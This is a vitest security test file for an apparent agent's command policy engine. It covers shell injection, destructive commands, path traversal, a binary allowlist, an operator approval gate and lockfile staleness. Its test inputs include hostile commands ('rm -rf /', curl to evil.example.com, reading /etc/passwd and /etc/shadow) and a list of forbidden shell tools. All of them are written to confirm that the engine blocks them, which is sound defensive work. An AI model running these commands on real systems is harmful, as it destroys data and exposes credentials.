/**
 * Security tests for CommandPolicyEngine (Phase 4).
 * Covers: path traversal, shell metacharacters, destructive commands,
 * secret redaction, stale lockfiles, approval gate enforcement.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { CommandPolicyEngine, ALLOWED_BINARIES } from '../../src/policy/commandPolicy.js';

function makeTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'cpe-test-'));
}

describe('CommandPolicyEngine — shell metacharacter injection', () => {
  let engine: CommandPolicyEngine;
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  const metacharCases = [
    { input: 'npm test; rm -rf /', label: 'semicolon chaining' },
    { input: 'npm test && curl http://evil.example.com', label: 'double-ampersand chaining' },
    { input: 'npm test | cat /etc/passwd', label: 'pipe redirection' },
    { input: 'npm test > /tmp/out.txt', label: 'stdout redirection' },
    { input: 'npm test < /dev/urandom', label: 'stdin redirection' },
    { input: 'npm test $(curl evil.example.com)', label: 'command substitution $()' },
    { input: 'npm test `whoami`', label: 'command substitution backtick' },
    { input: 'npm test\nrm -rf /', label: 'newline injection' },
    { input: 'npm test\rrm -rf /', label: 'carriage return injection' },
  ];

  for (const { input, label } of metacharCases) {
    it(`blocks: ${label}`, () => {
      const result = engine.validateCommand(input);
      expect(result.allowed).toBe(false);
      expect(result.risk).toBe('high');
    });
  }
});

describe('CommandPolicyEngine — destructive commands', () => {
  let engine: CommandPolicyEngine;
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  const destructiveCases = [
    'rm -rf /',
    'sudo npm install',
    'su root',
    'chmod 777 /etc/passwd',
    'chown root /etc/shadow',
    'git reset --hard HEAD~50',
    'git clean -fdx',
    'npm publish',
  ];

  for (const cmd of destructiveCases) {
    it(`blocks: ${cmd}`, () => {
      const result = engine.validateCommand(cmd);
      expect(result.allowed).toBe(false);
      expect(result.risk).toBe('high');
    });
  }
});

describe('CommandPolicyEngine — path traversal', () => {
  let engine: CommandPolicyEngine;
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('blocks path traversal outside workspace via ../', () => {
    const result = engine.validateCommand('npm test ../../etc/passwd');
    // The binary npm IS allowed but the arg escapes workspace
    expect(result.allowed).toBe(false);
    expect(result.risk).toBe('high');
  });

  it('allows paths that resolve inside workspace', () => {
    const result = engine.validateCommand('npm test ./src/index.ts');
    expect(result.allowed).toBe(true);
  });
});

describe('CommandPolicyEngine — binary allowlist', () => {
  let engine: CommandPolicyEngine;
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('allows all explicitly allowlisted binaries', () => {
    for (const binary of ALLOWED_BINARIES) {
      const result = engine.validateCommand(`${binary} --version`);
      expect(result.allowed).toBe(true);
    }
  });

  const forbiddenBinaries = [
    'curl',
    'wget',
    'bash',
    'sh',
    'powershell',
    'cmd',
    'python2',
    'node',
    'cat',
  ];
  for (const binary of forbiddenBinaries) {
    it(`blocks non-allowlisted binary: ${binary}`, () => {
      const result = engine.validateCommand(`${binary} --version`);
      expect(result.allowed).toBe(false);
    });
  }

  it('blocks empty command string', () => {
    const result = engine.validateCommand('');
    expect(result.allowed).toBe(false);
    expect(result.risk).toBe('high');
  });
});

describe('CommandPolicyEngine — approval gate', () => {
  let engine: CommandPolicyEngine;
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns pending_approval when no approvals-resolved.jsonl exists', async () => {
    const result = await engine.verifyFix('npm test', false);
    expect(result.status).toBe('pending_approval');
    expect(result.approvalId).toBeDefined();
  });

  it('queues approval in approvals-pending.jsonl when live run blocked', async () => {
    const result = await engine.verifyFix('npm test', false);
    expect(result.status).toBe('pending_approval');

    const pendingPath = path.join(tmpDir, '.agent-memory', 'approvals-pending.jsonl');
    expect(fs.existsSync(pendingPath)).toBe(true);
    const content = fs.readFileSync(pendingPath, 'utf8').trim();
    const parsed = JSON.parse(content) as { approvalId: string; requestedCommand: string };
    expect(parsed.approvalId).toBe(result.approvalId);
    expect(parsed.requestedCommand).toBe('npm test');
  });

  it('dry-run is allowed for any policy-passing command', async () => {
    const result = await engine.verifyFix('npm test', true);
    expect(result.status).toBe('dry_run_allowed');
  });

  it('resolves execution when matching approval exists in approvals-resolved.jsonl', () => {
    // Write a resolved approval
    const memoryDir = path.join(tmpDir, '.agent-memory');
    fs.mkdirSync(memoryDir, { recursive: true });
    const approval = {
      approvalId: 'appr_test001',
      createdAt: new Date().toISOString(),
      command: 'npm test',
      decision: 'approve',
      resolvedBy: 'operator',
      resolvedAt: new Date().toISOString(),
    };
    fs.writeFileSync(
      path.join(memoryDir, 'approvals-resolved.jsonl'),
      JSON.stringify(approval) + '\n',
      'utf8',
    );

    const isApproved = engine.hasResolvedApproval('npm test');
    expect(isApproved).toBe(true);
  });

  it('does not approve when approval entry has decision=reject', () => {
    const memoryDir = path.join(tmpDir, '.agent-memory');
    fs.mkdirSync(memoryDir, { recursive: true });
    const approval = {
      approvalId: 'appr_rejected',
      createdAt: new Date().toISOString(),
      command: 'npm test',
      decision: 'reject',
      resolvedBy: 'operator',
    };
    fs.writeFileSync(
      path.join(memoryDir, 'approvals-resolved.jsonl'),
      JSON.stringify(approval) + '\n',
      'utf8',
    );

    expect(engine.hasResolvedApproval('npm test')).toBe(false);
  });
});

describe('CommandPolicyEngine — secret redaction in outputs', () => {
  let engine: CommandPolicyEngine;
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('dry-run correctly blocks secret-containing commands', () => {
    // A command containing secret references should be policy-checked, not executed
    // The redaction concern here is on outputs from execution — we test policy blocks
    const secretCmd = 'curl https://api.example.com -H "Authorization: Bearer sk-secret-token"';
    const result = engine.validateCommand(secretCmd);
    // curl is not allowlisted
    expect(result.allowed).toBe(false);
  });

  it('dry_run_denied for policy violations', async () => {
    const result = await engine.verifyFix('rm -rf /tmp', true);
    expect(result.status).toBe('dry_run_denied');
  });
});

describe('CommandPolicyEngine — stale lockfile detection', () => {
  it('getLockfileHashes returns sha256 for present lockfiles', async () => {
    const tmpDir = makeTmpDir();
    try {
      // Write a fake package-lock.json
      fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), '{"lockfileVersion":3}', 'utf8');
      const { getLockfileHashes } = await import('../../src/core/staleness.js');
      const hashes = getLockfileHashes(tmpDir);
      expect(hashes['package-lock.json']).toMatch(/^sha256:[a-f0-9]{64}$/);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('checkRecordStaleness flags stale record when lockfile changed', async () => {
    const tmpDir = makeTmpDir();
    try {
      const { checkRecordStaleness, getLockfileHashes } = await import(
        '../../src/core/staleness.js'
      );

      // Create an initial lockfile
      fs.writeFileSync(path.join(tmpDir, 'package-lock.json'), '{"lockfileVersion":3}', 'utf8');
      const originalHashes = getLockfileHashes(tmpDir);

      // Now change the lockfile (simulate drift)
      fs.writeFileSync(
        path.join(tmpDir, 'package-lock.json'),
        '{"lockfileVersion":3,"updated":true}',
        'utf8',
      );

      const mockRecord = {
        schemaVersion: 1 as const,
        id: 'rec_stale001',
        createdAt: new Date().toISOString(),
        repositoryId: 'test-repo',
        command: 'npm test',
        exitCode: 1,
        rawOutputRedacted: 'error',
        normalizedOutput: 'error',
        fingerprint: 'sha256:abc',
        normalizerVersion: 1,
        fix: { commands: ['npm test'], explanation: 'fix', risk: 'low' as const },
        environment: {
          os: 'linux',
          node: 'v20.0.0',
          packageManager: 'npm',
          lockfileHashes: originalHashes,
        },
        verification: {
          status: 'unknown' as const,
          verifiedAt: null,
          method: 'dry_run',
          wilsonLowerBound: null,
        },
        provenance: { author: 'developer', commit: null },
        supersedes: null,
        tags: [],
        poisoningFlag: null,
      };

      const result = checkRecordStaleness(mockRecord, tmpDir, 1);
      expect(result.isStale).toBe(true);
      expect(result.staleReasons.some((r) => r.includes('package-lock.json'))).toBe(true);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('checkRecordStaleness flags stale record when normalizer version is behind', async () => {
    const { checkRecordStaleness } = await import('../../src/core/staleness.js');
    const tmpDir = makeTmpDir();
    try {
      const mockRecord = {
        schemaVersion: 1 as const,
        id: 'rec_normstale',
        createdAt: new Date().toISOString(),
        repositoryId: 'test-repo',
        command: 'npm test',
        exitCode: 1,
        rawOutputRedacted: 'error',
        normalizedOutput: 'error',
        fingerprint: 'sha256:abc',
        normalizerVersion: 1, // old version
        fix: { commands: ['npm test'], explanation: 'fix', risk: 'low' as const },
        environment: { os: 'linux', node: 'v20.0.0', packageManager: 'npm', lockfileHashes: {} },
        verification: {
          status: 'unknown' as const,
          verifiedAt: null,
          method: 'dry_run',
          wilsonLowerBound: null,
        },
        provenance: { author: 'developer', commit: null },
        supersedes: null,
        tags: [],
        poisoningFlag: null,
      };

      const result = checkRecordStaleness(mockRecord, tmpDir, 2); // current version = 2
      expect(result.isStale).toBe(true);
      expect(result.staleReasons.some((r) => r.includes('Normalizer version'))).toBe(true);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('checkRecordStaleness flags TTL expiry for old records', async () => {
    const { checkRecordStaleness } = await import('../../src/core/staleness.js');
    const tmpDir = makeTmpDir();
    try {
      const old = new Date();
      old.setDate(old.getDate() - 91); // 91 days ago, past 90-day TTL

      const mockRecord = {
        schemaVersion: 1 as const,
        id: 'rec_old001',
        createdAt: old.toISOString(),
        repositoryId: 'test-repo',
        command: 'npm test',
        exitCode: 1,
        rawOutputRedacted: 'error',
        normalizedOutput: 'error',
        fingerprint: 'sha256:abc',
        normalizerVersion: 1,
        fix: { commands: ['npm test'], explanation: 'fix', risk: 'low' as const },
        environment: { os: 'linux', node: 'v20.0.0', packageManager: 'npm', lockfileHashes: {} },
        verification: {
          status: 'unknown' as const,
          verifiedAt: null,
          method: 'dry_run',
          wilsonLowerBound: null,
        },
        provenance: { author: 'developer', commit: null },
        supersedes: null,
        tags: [],
        poisoningFlag: null,
      };

      const result = checkRecordStaleness(mockRecord, tmpDir, 1);
      expect(result.isStale).toBe(true);
      expect(result.staleReasons.some((r) => r.includes('90-day TTL'))).toBe(true);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

describe('Wilson-score lower bound', () => {
  it('returns null for zero trials', async () => {
    const { calculateWilsonScoreLowerBound } = await import('../../src/core/staleness.js');
    expect(calculateWilsonScoreLowerBound(0, 0)).toBeNull();
  });

  it('returns a value in [0,1] for valid inputs', async () => {
    const { calculateWilsonScoreLowerBound } = await import('../../src/core/staleness.js');
    const lb = calculateWilsonScoreLowerBound(8, 10);
    expect(lb).not.toBeNull();
    if (lb === null) throw new Error('Expected non-null lb');
    expect(lb).toBeGreaterThanOrEqual(0);
    expect(lb).toBeLessThanOrEqual(1);
  });

  it('all successes gives a higher lower bound than half successes', async () => {
    const { calculateWilsonScoreLowerBound } = await import('../../src/core/staleness.js');
    const allPass = calculateWilsonScoreLowerBound(10, 10);
    const halfPass = calculateWilsonScoreLowerBound(5, 10);
    if (allPass === null || halfPass === null) throw new Error('Expected non-null Wilson bounds');
    expect(allPass).toBeGreaterThan(halfPass);
  });
});
